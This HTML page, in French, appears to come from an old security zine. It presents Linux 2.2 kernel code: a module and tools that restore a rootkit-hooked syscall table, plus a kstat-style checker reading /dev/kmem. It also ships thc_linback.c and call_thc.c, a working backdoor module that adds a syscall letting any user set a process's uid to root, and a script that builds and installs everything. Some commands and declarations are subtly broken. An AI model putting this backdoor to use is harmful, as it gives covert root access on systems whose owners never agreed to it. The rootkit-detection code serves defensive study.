+<BR>*&nbsp;&nbsp;&nbsp;&nbsp;<FONT color=#ff6666> Note : </FONT>Si vous vous 
+apercevez avec kstat que votre systeme a deja ete infecter, il va vous falloir 
+modifier <BR>*&nbsp;&nbsp;&nbsp;&nbsp; ce module avant de le charger comme suit 
+: <BR>*&nbsp;&nbsp;&nbsp;&nbsp; Remplacer dans les #define RESTORE et SAVE 
+old_##x par def_##x.Ajouter une define pour chacun des 
+<BR>*&nbsp;&nbsp;&nbsp;&nbsp; 18 syscall que supporte ce module sur ce shema : 
+#define def_write&nbsp; 0xc0126c94&nbsp; ( addresse originel de sys_write ) 
+<BR>*&nbsp;&nbsp;&nbsp;&nbsp; La derniere petite modification est de copier la 
+define de RESTORE ainsi que tout ces appel dans init_module, pour 
+<BR>*&nbsp;&nbsp;&nbsp;&nbsp; que la sauvegarde des 15 premiers octets de 
+syscall qui est faite ne soit pas corromput. <BR>* <BR>* 
+<BR>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * Compilation en douceur avec : <BR>* 
+<BR>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#33ccff>gcc patch.c -c 
+-D__KERNEL__ -DMODULE -DMODVERSIONS -I/usr/src/linux/include -O6</FONT> 
+<BR>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#33ccff>insmod 
+patch.o</FONT> pour le charger. <BR>* <BR>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+Auteur : <FONT color=#ff6666>saur0n</FONT> <BR>* 
+<BR>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; E-mail : humour@humour.com 
+<BR>*/</FONT> 
+<P><FONT face="Courier New" size=2>#define __KERNEL_SYSCALLS__ <BR>#include 
+&lt;linux/version.h&gt; <BR>#include &lt;linux/module.h&gt; <BR>#include 
+&lt;linux/kernel.h&gt;</FONT> 
+<P><FONT face="Courier New" size=2>#include &lt;linux/sched.h&gt; <BR>#include 
+&lt;linux/smp_lock.h&gt; <BR>#include &lt;linux/stat.h&gt; <BR>#include 
+&lt;linux/dirent.h&gt; <BR>#include &lt;linux/fs.h&gt; <BR>#include 
+&lt;linux/if.h&gt; <BR>#include &lt;linux/modversions.h&gt; <BR>#include 
+&lt;linux/malloc.h&gt; <BR>#include &lt;linux/unistd.h&gt; <BR>#include 
+&lt;linux/string.h&gt; <BR>#include &lt;linux/skbuff.h&gt; <BR>#include 
+&lt;linux/ip.h&gt; <BR>#include &lt;sys/syscall.h&gt;</FONT> 
+<P><FONT face="Courier New" size=2>#include &lt;linux/dirent.h&gt; <BR>#include 
+&lt;linux/proc_fs.h&gt; <BR>#include &lt;asm/uaccess.h&gt; <BR>#include 
+&lt;asm/errno.h&gt;</FONT> 
+<P><FONT face="Courier New" size=2>#define SYSNUM 191</FONT> 
+<P><FONT face="Courier New" size=2>extern void *sys_call_table[];</FONT> 
+<P><FONT face="Courier New" size=2>static char code_getdents[15]; <BR>static 
+char code_kill[15]; <BR>static char code_read[15]; <BR>static char 
+code_ioctl[15]; <BR>static char code_fork[15]; <BR>static char code_clone[15]; 
+<BR>static char code_execve[15]; <BR>static char code_settimeofday[15]; 
+<BR>static char code_close[15]; <BR>static char code_symlink[15]; <BR>static 
+char code_mkdir[15]; <BR>static char code_write[15]; <BR>static char 
+code_unlink[15]; <BR>static char code_chdir[15]; <BR>static char 
+code_setuid[15]; <BR>static char code_getuid[15]; <BR>static char 
+code_socketcall[15]; <BR>static char code_query_module[15];</FONT> 
+<P><FONT face="Courier New" size=2>int (*old_getdents)(unsigned int, struct 
+dirent *, unsigned int); <BR>int (*old_kill)(int, int); <BR>int 
+(*old_read)(unsigned int, char *, size_t); <BR>int (*old_ioctl)(int, int, long); 
+<BR>int (*old_fork)(struct pt_regs); <BR>int (*old_clone)(struct pt_regs); 
+<BR>int (*old_execve)(struct pt_regs); <BR>int (*old_settimeofday)(struct 
+timeval *, struct timezone *); <BR>int (*old_close)(unsigned int); <BR>int 
+(*old_symlink)(const char *, const char*); <BR>long (*old_mkdir)(const char *, 
+int); <BR>int (*old_write)(unsigned int, char *, size_t); <BR>int (*old_unlink) 
+(const char *) ; <BR>int (*old_chdir) (const char *) ; <BR>int (*old_setuid) 
+(uid_t) ; <BR>int (*old_getuid) () ; <BR>int (*old_socketcall) (int, unsigned 
+long *); <BR>int (*old_query_module)(const char *, int, char *, size_t, size_t 
+*) ;</FONT> 
+<P><FONT face="Courier New" size=2>int (*oldfunc)();</FONT> 
+<P><FONT face="Courier New" size=2>void *_memcpy(void *dest, const void *src, 
+int size)</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;&nbsp;&nbsp;&nbsp; { 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; const char *p = src; 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char *q = dest; 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int i;</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (i = 0; i 
+&lt; size; i++) *q++ = *p++;</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return dest; 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp; }</FONT> 
+<P><FONT face="Courier New" size=2>asmlinkage int restore_system() {</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;&nbsp;&nbsp; #define RESTORE(x) 
+sys_call_table[__NR_##x] = old_##x <BR>&nbsp;&nbsp;&nbsp; RESTORE(write); 
+<BR>&nbsp;&nbsp;&nbsp; RESTORE(close); <BR>&nbsp;&nbsp;&nbsp; RESTORE(mkdir); 
+<BR>&nbsp;&nbsp;&nbsp; RESTORE(getdents); <BR>&nbsp;&nbsp;&nbsp; RESTORE(kill); 
+<BR>&nbsp;&nbsp;&nbsp; RESTORE(read); <BR>&nbsp;&nbsp;&nbsp; RESTORE(ioctl); 
+<BR>&nbsp;&nbsp;&nbsp; RESTORE(fork); <BR>&nbsp;&nbsp;&nbsp; RESTORE(clone); 
+<BR>&nbsp;&nbsp;&nbsp; RESTORE(settimeofday); <BR>&nbsp;&nbsp;&nbsp; 
+RESTORE(execve); <BR>&nbsp;&nbsp;&nbsp; RESTORE(unlink); <BR>&nbsp;&nbsp;&nbsp; 
+RESTORE(chdir); <BR>&nbsp;&nbsp;&nbsp; RESTORE(setuid); <BR>&nbsp;&nbsp;&nbsp; 
+RESTORE(getuid); <BR>&nbsp;&nbsp;&nbsp; RESTORE(socketcall); 
+<BR>&nbsp;&nbsp;&nbsp; RESTORE(query_module);</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;&nbsp;&nbsp; #define NOHIJACK(hca) 
+_memcpy(sys_call_table[__NR_##hca], code_##hca, sizeof(code_##hca)); 
+<BR>&nbsp;&nbsp;&nbsp; NOHIJACK(write); <BR>&nbsp;&nbsp;&nbsp; NOHIJACK(close); 
+<BR>&nbsp;&nbsp;&nbsp; NOHIJACK(mkdir); <BR>&nbsp;&nbsp;&nbsp; 
+NOHIJACK(getdents); <BR>&nbsp;&nbsp;&nbsp; NOHIJACK(kill); 
+<BR>&nbsp;&nbsp;&nbsp; NOHIJACK(read); <BR>&nbsp;&nbsp;&nbsp; NOHIJACK(ioctl); 
+<BR>&nbsp;&nbsp;&nbsp; NOHIJACK(fork); <BR>&nbsp;&nbsp;&nbsp; NOHIJACK(clone); 
+<BR>&nbsp;&nbsp;&nbsp; NOHIJACK(settimeofday); <BR>&nbsp;&nbsp;&nbsp; 
+NOHIJACK(execve); <BR>&nbsp;&nbsp;&nbsp; NOHIJACK(unlink); 
+<BR>&nbsp;&nbsp;&nbsp; NOHIJACK(chdir); <BR>&nbsp;&nbsp;&nbsp; NOHIJACK(setuid); 
+<BR>&nbsp;&nbsp;&nbsp; NOHIJACK(getuid); <BR>&nbsp;&nbsp;&nbsp; 
+NOHIJACK(socketcall); <BR>&nbsp;&nbsp;&nbsp; NOHIJACK(query_module); 
+<BR>&nbsp;&nbsp;&nbsp; return 0; <BR>}</FONT> 
+<P><FONT face="Courier New" size=2>int init_module(void) <BR>{</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;&nbsp;&nbsp; #define TAPEUNEDOUILLE(x) 
+old_##x = sys_call_table[__NR_##x] <BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(write); 
+<BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(close); <BR>&nbsp;&nbsp;&nbsp; 
+TAPEUNEDOUILLE(mkdir); <BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(getdents); 
+<BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(kill); <BR>&nbsp;&nbsp;&nbsp; 
+TAPEUNEDOUILLE(read); <BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(ioctl); 
+<BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(fork); <BR>&nbsp;&nbsp;&nbsp; 
+TAPEUNEDOUILLE(clone); <BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(settimeofday); 
+<BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(execve); <BR>&nbsp;&nbsp;&nbsp; 
+TAPEUNEDOUILLE(unlink); <BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(chdir); 
+<BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(setuid); <BR>&nbsp;&nbsp;&nbsp; 
+TAPEUNEDOUILLE(getuid); <BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(socketcall); 
+<BR>&nbsp;&nbsp;&nbsp; TAPEUNEDOUILLE(query_module);</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;&nbsp;&nbsp; #define SAVE(hca) 
+_memcpy(code_##hca, sys_call_table[__NR_##hca],sizeof(code_##hca)); 
+<BR>&nbsp;&nbsp;&nbsp; SAVE(write); <BR>&nbsp;&nbsp;&nbsp; SAVE(close); 
+<BR>&nbsp;&nbsp;&nbsp; SAVE(mkdir); <BR>&nbsp;&nbsp;&nbsp; SAVE(getdents); 
+<BR>&nbsp;&nbsp;&nbsp; SAVE(kill); <BR>&nbsp;&nbsp;&nbsp; SAVE(read); 
+<BR>&nbsp;&nbsp;&nbsp; SAVE(ioctl); <BR>&nbsp;&nbsp;&nbsp; SAVE(fork); 
+<BR>&nbsp;&nbsp;&nbsp; SAVE(clone); <BR>&nbsp;&nbsp;&nbsp; SAVE(settimeofday); 
+<BR>&nbsp;&nbsp;&nbsp; SAVE(execve); <BR>&nbsp;&nbsp;&nbsp; SAVE(unlink); 
+<BR>&nbsp;&nbsp;&nbsp; SAVE(chdir); <BR>&nbsp;&nbsp;&nbsp; SAVE(setuid); 
+<BR>&nbsp;&nbsp;&nbsp; SAVE(getuid); <BR>&nbsp;&nbsp;&nbsp; SAVE(socketcall); 
+<BR>&nbsp;&nbsp;&nbsp; SAVE(query_module); <BR>&nbsp;&nbsp;&nbsp; oldfunc = 
+sys_call_table[SYSNUM]; <BR>&nbsp;&nbsp;&nbsp; sys_call_table[SYSNUM] = 
+restore_system; <BR>&nbsp;&nbsp;&nbsp; return 0; <BR>}</FONT> 
+<P><FONT face="Courier New" size=2>void cleanup_module(void) <BR>{ 
+<BR>&nbsp;&nbsp;&nbsp; sys_call_table[SYSNUM] = oldfunc; <BR>}&nbsp;</FONT> 
+<CENTER>
+<P><FONT face="Courier New" size=2>-=-=-=-=-=-=-=- Cut Here 
+=-=-=-=-=-=-=-=-</FONT></CENTER>
+<P><B><FONT color=#33ccff face="Courier New" size=2>callpatch.c :</FONT></B> 
+<FONT face="Courier New" size=2><BR>&nbsp;</FONT> 
+<P><FONT face="Courier New" size=2>/* <BR>call_regenerator place $0xbf ( 191 ) 
+dans %eax avant d'appeler l'interuption int $0x80 qui a pour <BR>effet d'appeler 
+le syscall dont %eax contient le numero, vous devrez donc modifier une ligne 
+<BR>si vous voulez attribuez un autre numero de syscall a ce patch. <BR>*/ 
+<BR>#include &lt;asm/unistd.h&gt; <BR>#include &lt;stdio.h&gt;</FONT> 
+<P><FONT face="Courier New" size=2>int errno;</FONT> 
+<P><FONT face="Courier New" size=2>int call_regenerator() <BR>{</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;&nbsp; __asm__(" <BR>&nbsp;movl $191, 
+%eax <BR>&nbsp;int $0x80 <BR>"); <BR>}</FONT> 
+<P><FONT face="Courier New" size=2>int main() <BR>{ <BR>printf("\n[!] Codé par 
+Sauron.\n[*] Syscall table regenert0r launching !\n"); <BR>call_regenerator(); 
+<BR>printf("Done.\n\n");</FONT>
+<P><FONT face="Courier New" size=2>}</FONT> 
+<CENTER>
+<P><FONT face="Courier New" size=2>-=-=-=-=-=-=-=- Cut Here 
+=-=-=-=-=-=-=-=-</FONT></CENTER>
+<P><B><FONT color=#33ccff face="Courier New" size=2>Voici kmemread.c 
+:</FONT></B> 
+<P><FONT face="Courier New" size=2>&nbsp; /* <BR>* Description : Il s'agit d'un 
+programme qui va chercher l'adresse des syscall <BR>* souvent modifier par les 
+rootkit dans /dev/kmem directement pour ensuite faire <BR>* appele a un module 
+qui restorera la sys_call_table dans son etat avant trojanisation <BR>* Les 
+modules trojan modifiant les syscall n'auront donc plus aucun effet. Le module 
+<BR>* peut recommencer autant de fois que necessaire. Une petite modification du 
+binaire <BR>* /sbin/insmod ( ou une redirection en execution ) peut s'averer 
+necessaire pour <BR>* que mon module soit appeler immediatement apres insmod 
+appeler. Ainsi vous vous <BR>* assurez qu'aucun module trojan ne poura etre 
+installer. Cela vous evite de mettre <BR>* le restaurateur de syscall et de la 
+sys_call_table dans vos cron. <BR>* <BR>* Auteur : j'ai ( saur0n ) simplement 
+modifier le code de <BR>* FuSyS de "SoftProject Digital Security for Y2K" fourni 
+avec kstat pour l'associer <BR>* avec mon module et pour que celui ci puisse 
+etre efficasse meme si le systeme <BR>* est deja compromis lors de son 
+chargement :-) <BR>* <BR>*/</FONT> 
+<P><FONT face="Courier New" size=2>#define __KERNEL__ <BR>#include 
+&lt;linux/netdevice.h&gt; <BR>#include &lt;linux/inetdevice.h&gt; <BR>#include 
+&lt;linux/if_arp.h&gt; <BR>#include &lt;linux/sched.h&gt; <BR>#include 
+&lt;linux/capability.h&gt; <BR>#include &lt;linux/module.h&gt; <BR>#undef 
+__KERNEL__</FONT> 
+<P><FONT face="Courier New" size=2>#define SYSTEMMAP "/boot/System.map" 
+<BR>#define QM_SYMBOLS 4 <BR>#include &lt;errno.h&gt; <BR>#define SEEK_SET 0 
+<BR>typedef struct _IO_FILE FILE; <BR>extern FILE *fopen __P ((__const char 
+*__restrict __filename, <BR>__const char *__restrict __modes)); <BR>extern char 
+*fgets __P ((char *__restrict __s, int __n, <BR>FILE *__restrict __stream)); 
+<BR>extern unsigned long int strtoul __P ((__const char *__restrict __nptr, 
+<BR>char **__restrict __endptr, <BR>int __base)); <BR>extern int printf __P 
+((__const char *__restrict __format, ...)); <BR>extern int open __P ((__const 
+char *__file, int __oflag, ...)); <BR>extern __ptr_t realloc __P ((__ptr_t 
+__ptr, size_t __size)); <BR>extern void free __P ((__ptr_t __ptr)); <BR>extern 
+off_t lseek __P ((int __fd, off_t __offset, int __whence)) <BR>extern ssize_t 
+read __P ((int __fd, __ptr_t __buf, size_t __nbytes)); <BR>extern __ptr_t malloc 
+__P ((size_t __size));</FONT> 
+<P><FONT face="Courier New" size=2>#define KMEM "/dev/kmem" <BR>#define SYSCALL 
+"sys_call_table"</FONT> 
+<P><FONT face="Courier New" size=2>int errno, fd; <BR>char *iff, 
+name[10];</FONT> 
+<P><FONT face="Courier New" size=2>void uso(char*); <BR>int 
+find_kmem_offset(char*); <BR>int kread(int, unsigned long, void*, int); <BR>void 
+err(char*); <BR>int find_maddr(char*); <BR>void show_syscalls(); <BR>unsigned 
+long find_smap_addr(char*);</FONT> 
+<P><FONT face="Courier New" size=2>struct new_module_symbol <BR>{ <BR>unsigned 
+long value; <BR>unsigned long name; <BR>};</FONT> 
+<P><FONT face="Courier New" size=2>int query_module(const char *name, int which, 
+void *buf, size_t bufsize, <BR>size_t *ret);</FONT> 
+<P><FONT face="Courier New" size=2>int find_kmem_offset(char *sym_name) <BR>{ 
+<BR>struct new_module_symbol *syms, *s; <BR>size_t ret, bufsize, nsymbols, 
+j;</FONT> 
+<P><FONT face="Courier New" size=2>syms=malloc(bufsize = sizeof(struct 
+new_module_symbol)); <BR>retry_kern_symbol_load: <BR>if(query_module(NULL, 
+QM_SYMBOLS, syms, bufsize, &amp;ret)){ <BR>if (errno == ENOSPC){ <BR>syms 
+=(struct new_module_symbol *)realloc(syms, bufsize = ret); <BR>goto 
+retry_kern_symbol_load; <BR>} <BR>printf("find_kmem_offset: QM_SYMBOLS error 
+%d\n", errno); <BR>return -1; <BR>} <BR>nsymbols = ret;</FONT> 
+<P><FONT face="Courier New" size=2>for (j = 0, s = syms; j &lt; nsymbols; ++j, 
+++s){ <BR>if(strstr((char *)syms+s-&gt;name, sym_name)){ <BR>free(syms); 
+<BR>return s-&gt;value; <BR>} <BR>} <BR>printf("%s Kmem Offset Not Found\n\n", 
+sym_name); <BR>free(syms); <BR>return -1; <BR>}</FONT> 
+<P><FONT face="Courier New" size=2>int kread(int des, unsigned long addr, void 
+*buf, int len) <BR>{ <BR>int rlen;</FONT> 
+<P><FONT face="Courier New" size=2>if(lseek(des, (off_t)addr, SEEK_SET) == -1) 
+<BR>return -1; <BR>if((rlen = read(des, buf, len)) != len) <BR>return -1; 
+<BR>return rlen; <BR>}</FONT> 
+<P><FONT face="Courier New" size=2>#define NR 18</FONT> 
+<P><FONT face="Courier New" size=2>char *sysc[NR]={ <BR>"ni_syscall", 
+<BR>"write","close","mkdir", "getdents", "kill", "read", "ioctl", "fork", 
+"clone", "settimeofday", "execve", "unlink", "chdir", "setuid", "getuid", 
+"socketcall", "query_module"};</FONT> 
+<P><FONT face="Courier New" size=2>unsigned long find_smap_addr(char *syscall) 
+<BR>{ <BR>FILE *fd; <BR>char buff[8192], call[50], addr[15];</FONT> 
+<P><FONT face="Courier New" size=2>fd=fopen(SYSTEMMAP, "r");</FONT> 
+<P><FONT face="Courier New" size=2>memset(&amp;call, '\0', 50); 
+<BR>memset(&amp;addr, '\0', 15); <BR>strncat(call, "sys_", 4); <BR>strncat(call, 
+syscall, strlen(syscall)); <BR>strncat(call, "\n", 1); 
+<BR>call[5+strlen(syscall)+1]='\0'; <BR>while((fgets(buff, 8192, fd))!=NULL){ 
+<BR>if(strstr(buff, call)){ <BR>if(!strcmp(buff+11, call)){ <BR>strncat(addr, 
+"0x", 2); <BR>strncat(addr, buff, 8); <BR>addr[11]='\0'; 
+<BR>return(strtoul(addr, NULL, 0)); <BR>} <BR>} <BR>} <BR>return -1; 
+<BR>}</FONT> 
+<P><FONT face="Courier New" size=2>void show_syscalls() <BR>{ <BR>int kd, i; 
+<BR>unsigned int kaddr; <BR>unsigned long kmem_call_table[NR], smapaddr;</FONT> 
+<P><FONT face="Courier New" size=2>kaddr=find_kmem_offset(SYSCALL); 
+<BR>kd=open(KMEM, O_RDONLY); <BR>if(kread(kd, (unsigned long)kaddr, 
+&amp;kmem_call_table, sizeof(kmem_call_table)) == -1) err("[!] Erreur pendant la 
+lecture de /dev/kmem avec kread ! desole ...");</FONT> 
+<P><FONT face="Courier New" size=2>printf("[- Syscall -] [-Address d'origine 
+-]"); <BR>for(i=1; i &lt; NR; i++) <BR>if(kmem_call_table[i]){ 
+<BR>printf("\nsys_%-22s", <BR>sysc[i]); <BR>smapaddr=find_smap_addr(sysc[i]); 
+<BR>if(kmem_call_table[i] != smapaddr &amp;&amp; smapaddr!=0xffffffff) 
+<BR>printf("%p", <BR>(void*)smapaddr); <BR>} <BR>printf("\n"); <BR>}</FONT> 
+<CENTER>
+<P><FONT face="Courier New" size=2>-=-=-=-=-=-=-=- Cut Here 
+=-=-=-=-=-=-=-=-</FONT></CENTER>
+<P><B><FONT color=#33ccff face="Courier New" size=2>Voici main.c :</FONT></B> 
+<P><FONT face="Courier New" size=2>#define __KERNEL__ <BR>#include 
+&lt;linux/module.h&gt; <BR>#undef __KERNEL__ <BR>void show_syscalls(); <BR>int 
+main() { <BR>show_syscalls(); <BR>exit(0); <BR>}</FONT> 
+<CENTER>
+<P><FONT face="Courier New" size=2>-=-=-=-=-=-=-=- Cut Here 
+=-=-=-=-=-=-=-=-</FONT></CENTER>
+<P><B><FONT color=#33ccff face="Courier New" size=2>Voila thc_linback.c 
+:</FONT></B> 
+<P><FONT face="Courier New" size=2>/* <BR>&nbsp;*&nbsp; idea &amp; credits go to 
+pragmatic / THC and his "Attacking FreeBSD with Kernel Modules" 
+<BR>&nbsp;*&nbsp; ported to linux by belf@s0ftpj.org (tested on debian 2.2 - 
+kernel 2.2.15) <BR>&nbsp;*&nbsp; compile with 'gcc -c thc_linback.c -O6 
+-I/usr/src/linux/include/' <BR>&nbsp;*&nbsp; greetz to pig and vecna @ 
+s0ftpj.org <BR>&nbsp;*/</FONT> 
+<P><FONT face="Courier New" size=2>#define __KERNEL__ <BR>#define MODULE</FONT> 
+<P><FONT face="Courier New" size=2>#include &lt;linux/kernel.h&gt; <BR>#include 
+&lt;linux/module.h&gt; <BR>#include &lt;asm/unistd.h&gt; <BR>#include 
+&lt;asm/current.h&gt; <BR>#include &lt;linux/sched.h&gt;</FONT> 
+<P><FONT face="Courier New" size=2>#define MYFUNC 192 // here you have to define 
+where register the syscall (see arch/i386/kernel/entry.S)</FONT> 
+<P><FONT face="Courier New" size=2>extern void *sys_call_table[];</FONT> 
+<P><FONT face="Courier New" size=2>int (*fuqfunc)();</FONT> 
+<P><FONT face="Courier New" size=2>asmlinkage int you_make_me_real(unsigned 
+short k_uid, int k_pid) { <BR>&nbsp;struct task_struct *q;</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;for_each_task(q) { <BR>&nbsp; 
+if(q-&gt;pid == k_pid) { <BR>&nbsp;&nbsp; q-&gt;uid = k_uid; <BR>&nbsp;&nbsp; 
+q-&gt;euid = k_uid; <BR>&nbsp;&nbsp; return 0; <BR>&nbsp; } <BR>&nbsp;} 
+<BR>&nbsp;return -1; <BR>}</FONT> 
+<P><FONT face="Courier New" size=2>int init_module() { <BR>&nbsp;fuqfunc = 
+sys_call_table[MYFUNC]; <BR>&nbsp;sys_call_table[MYFUNC] = you_make_me_real; 
+<BR>&nbsp;printk("func (0x%x) registered at offset 0x%x\n", you_make_me_real, 
+sys_call_table[MYFUNC]); <BR>&nbsp;return 0; <BR>}</FONT> 
+<P><FONT face="Courier New" size=2>void cleanup_module() { 
+<BR>&nbsp;sys_call_table[MYFUNC] = fuqfunc; <BR>&nbsp;printk("func registered at 
+offset 0x%x released\n", sys_call_table[MYFUNC]);</FONT> 
+<P><FONT face="Courier New" size=2>}</FONT> 
+<CENTER>
+<P><B><FONT face="Courier New" size=2>-=-=-=-=-=-=-=- Cut Here 
+=-=-=-=-=-=-=-=-</FONT></B></CENTER>
+<P><B><FONT color=#33ccff face="Courier New" size=2>Voila call_thc.c 
+:</FONT></B> 
+<P><FONT face="Courier New" size=2>/* <BR>&nbsp;* How to use the syscall 
+you_make_me_real() <BR>&nbsp;* belf@s0ftpj.org <BR>&nbsp;* greetz to pIG ;) 
+<BR>&nbsp;*/</FONT> 
+<P><FONT face="Courier New" size=2>#include &lt;asm/unistd.h&gt;</FONT> 
+<P><FONT face="Courier New" size=2>#define MYFUNC 192</FONT> 
+<P><FONT face="Courier New" size=2>int errno;</FONT> 
+<P><FONT face="Courier New" size=2>int call_you_make_me_real(unsigned short uid, 
+int pid) { <BR>&nbsp;long __res; <BR>&nbsp;__asm__ volatile ("int $0x80" 
+<BR>&nbsp;&nbsp; : "=a" (__res) <BR>&nbsp;&nbsp; : "0" (MYFUNC),"b" 
+((long)(uid)),"c" ((long)(pid))); <BR>&nbsp;__syscall_return(int,__res); 
+<BR>}</FONT> 
+<P><FONT face="Courier New" size=2>int main(int argc, char *argv[]) { 
+<BR>&nbsp;if(argc != 3) { <BR>&nbsp; printf("%s &lt;uid&gt; &lt;pid&gt;\n", 
+argv[0]); <BR>&nbsp; exit(-1); <BR>&nbsp;} <BR>&nbsp;printf("return code is: 
+%d!\n", call_you_make_me_real(atoi(argv[1]), atoi(argv[2]))); <BR>}</FONT> 
+<CENTER>
+<P><FONT face="Courier New" size=2>-=-=-=-=-=-=-=- Cut Here 
+=-=-=-=-=-=-=-=-</FONT></CENTER>
+<P><B><FONT color=#33ccff face="Courier New" size=2>Et enfin voici le script 
+shell qui vous installera tout ca , vous n'avez plus qu'a placer ces differents 
+fichier dans un seul et meme repertoire :</FONT></B> 
+<P><FONT face="Courier New" size=2>#!/bin/sh <BR>uname -a | grep inux | grep 2.2 
+&gt;/dev/null || echo Avez vous vraiment un kernel linux 2.2.x ? <BR>gcc -O2 
+-Wall -Werror -I/usr/src/linux/include main.c -c 2&amp;&gt;1 <BR>gcc -O2 -Wall 
+-Werror -I/usr/src/linux/include kmemread.c -c 2&amp;&gt;1 <BR>gcc -O2 -Wall 
+-Werror -I/usr/src/linux/include main.o kmemread.o -o kstat 2&amp;&gt;1 
+<BR><FONT color=#ffffff>gcc patch.c -c -D__KERNEL__ -DMODULE -DMODVERSIONS 
+-I/usr/src/linux/include -O6 </FONT>2&amp;&gt;1 <BR><FONT color=#ffffff>gcc 
+callpatch.c -o callpatch </FONT>2&amp;&gt;1 <BR>gcc -c thc_linback.c -O6 
+-I/usr/src/linux/include/ 2&amp;&gt;1 <BR>gcc call_thc.c -o call_thc 2&amp;&gt;1 
+<BR>echo [*] Now launch kstat then insmod patch.o if all s good <BR>echo [*] 
+Else read the comment in the header source of the module. <BR>echo [*] Then 
+lauch callpatch for restore your system <BR>echo [*] Insmod thc_linback.o for 
+play with uid of pid ! <BR>echo [*] use call_thc to do this ! <BR>echo [*] 
+Amusez vous bien avec tout ca :-\)</FONT> </P></BODY></HTML>
